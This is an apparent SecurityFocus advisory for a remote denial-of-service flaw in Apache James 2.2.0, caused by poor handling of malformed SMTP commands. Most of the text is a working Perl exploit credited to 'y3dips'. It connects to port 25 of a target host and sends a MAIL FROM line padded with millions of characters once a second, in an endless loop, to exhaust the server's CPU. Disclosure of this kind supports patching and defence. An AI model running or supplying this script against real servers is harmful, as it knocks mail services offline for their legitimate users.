source: http://www.securityfocus.com/bid/18138/info

Apache James is prone to a remote denial-of-service vulnerability. This issue is due to the application's failure to efficiently handle malformed SMTP commands.

This issue allows remote attackers to consume excessive CPU resources of affected computers, potentially denying service to legitimate users.

Apache James version 2.2.0 is vulnerable to this issue; other versions may also be affected.

#!/usr/bin/perl -w

use IO::Socket;

print "* DOS buat JAMES ver.2.2.0 by y3dips *\n";

if(@ARGV == 1)

{

      my $host = $ARGV[0];
      my $i = 1;

$socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>$host, PeerPort=>"25", Reuse=>1)
or die " Cannot Connect to Server !";

while ( $i++ ) {
print $socket "MAIL FROM:" . "fvclz" x 1000000 . "\r\n" and
print " -- sucking CPU resources at $host .....\n";
sleep(1);
}
  close $socket;

}
else
 {  print " Usage: $0 [target] \r\n\n";  }
